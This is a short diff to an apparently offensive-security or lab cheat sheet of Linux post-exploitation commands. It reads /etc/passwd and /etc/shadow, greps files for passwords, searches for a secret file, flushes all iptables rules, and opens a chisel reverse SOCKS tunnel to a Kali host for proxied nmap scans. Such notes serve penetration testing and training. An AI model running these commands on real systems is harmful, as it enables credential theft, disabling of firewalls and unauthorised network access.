@@ -14,14 +14,16 @@ ls -la /etc/passwd /etc/shadow; cat /etc/passwd
 ls -la /opt /srv /home
 ls -lah /etc/cron*; cat /etc/crontab
 find / -iname network-secret.txt 2>/dev/null
+find . -type f | grep -vE "(.js|.html)" | xargs grep -i "pass"
 
 # network
 netstat -tulpn || ss -tulpn
-iptales -S
+iptables -S
+iptables -F        # remove all iptables rules
 hostname
 ip a; ip route show
 /sbin/route
-cat /etc/iptables
+ls -la /etc/iptables/; cat /etc/iptables/*
 tcpdump -i tun0 icmp
 ./chisel_linux64 client kali-docker:9999 R:socks
 sudo proxychains nmap -v -sT -Pn --top-ports 1000 "$rhost"
